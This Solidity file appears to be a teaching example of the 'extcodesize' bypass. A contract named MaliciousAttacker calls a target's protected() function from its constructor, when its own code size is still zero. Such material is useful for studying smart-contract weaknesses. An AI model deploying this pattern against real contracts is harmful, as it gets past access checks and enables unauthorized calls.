// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Bypasscontrol.sol";

// Malicious contract exploiting the 'extcodesize' vulnerability
contract MaliciousAttacker {
    Target public target;

    // Constructor where the attack vector activates
    constructor(address _target) {
        target = Target(_target);
        // Invokes the protected function using constructor
        target.protected();
    }
}